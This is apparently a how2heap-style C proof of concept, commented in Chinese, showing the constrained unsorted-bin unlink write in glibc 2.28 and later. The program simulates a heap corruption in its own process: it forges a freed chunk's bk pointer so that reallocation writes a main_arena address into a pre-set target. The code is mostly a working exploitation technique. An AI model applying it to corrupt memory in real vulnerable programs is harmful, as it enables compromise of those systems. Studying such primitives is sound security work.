#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * glibc 2.28 起的“受约束 unsorted 写”。这不是旧版的任意初值 target：
 * 摘链前源码要求
 *
 *     bck = victim->bk;
 *     if (bck->fd != victim) abort();
 *     bck->fd = unsorted_chunks(av);
 *
 * 因而目标 qword 必须预先等于 victim 的 chunk header 地址。若题目已有一次
 * 写/数据搬运能建立这个前置状态，unsorted 摘链仍可把 main_arena 附近地址
 * 写过去。本 PoC 把这种 compare-before-write 约束和 2.23~2.27 经典形式分开。
 */

int main(void)
{
    setbuf(stdout, NULL);

    /* request=0x410 -> chunk size=0x420，不会进入 small tcache。 */
    unsigned long *victim_user = malloc(0x410);
    /* guard 也要大于 tcache 上限；否则 2.43 首次 free 时可能延迟初始化
     * tcache，并让内部分配从 top 切割/改写紧邻 victim 的 header。 */
    void *guard = malloc(0x410);
    assert(victim_user != NULL && guard != NULL);

    /* 提前初始化 tcache，把“内部初始化时机”从待测 unsorted 路径移走。 */
    void *small = malloc(0x20);
    assert(small != NULL);
    free(small);

    free(victim_user);

    unsigned long *victim_chunk = victim_user - 2;
    unsigned long unsorted_head = victim_user[0]; /* free 后 fd 指向 unsorted head */
    volatile unsigned long target = (unsigned long)victim_chunk;

    /*
     * 漏洞模拟：victim->bk = target - 0x10。内部 bck->fd 正好落在 target，
     * 而 target 已预置为 victim_chunk，所以 2.28+ 的一致性检查能够通过。
     */
    victim_user[1] = (unsigned long)((unsigned char *)&target - 0x10);

    void *again = malloc(0x410);
    assert(again == victim_user);

    /* 摘链最后把 bck->fd 改成 unsorted_chunks(av)。 */
    assert(target == unsorted_head);
    assert(target != (unsigned long)victim_chunk);

    puts("[+] unsorted：受约束写成功");
    return 0;
}
